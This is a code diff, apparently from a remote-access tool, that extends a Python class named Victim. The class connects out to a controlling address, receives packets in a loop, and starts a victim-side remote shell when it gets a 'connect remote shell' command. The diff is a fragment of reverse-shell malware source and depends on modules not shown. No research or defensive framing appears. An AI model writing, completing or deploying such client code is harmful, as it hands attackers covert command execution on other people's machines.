@@ -1,5 +1,9 @@
 from socket import socket, AF_INET, SOCK_STREAM
 
+from src.modlues.protocols.general import GeneralPacketType
+from src.modlues.protocols.protocol import HandelPacket, Packet, PacketType
+from src.modlues.remote_shell.victim_rsh import RemoteShellVictimSide
+
 
 class Victim:
 
@@ -12,6 +16,13 @@ class Victim:
 
     def main(self):
         self.__connect()
+        while self.connected:
+            packet = HandelPacket.recv_packet(self.victim)
+            self.handle(packet)
+
+    def handle(self, packet: Packet):
+        if packet.packet_type == PacketType.GENERAL.value and packet.packet_sub_type == GeneralPacketType.CONNECT_RSH.value:
+            RemoteShellVictimSide(self.victim).main()
 
     def __connect(self):
         self.victim.connect(self.ADDR)
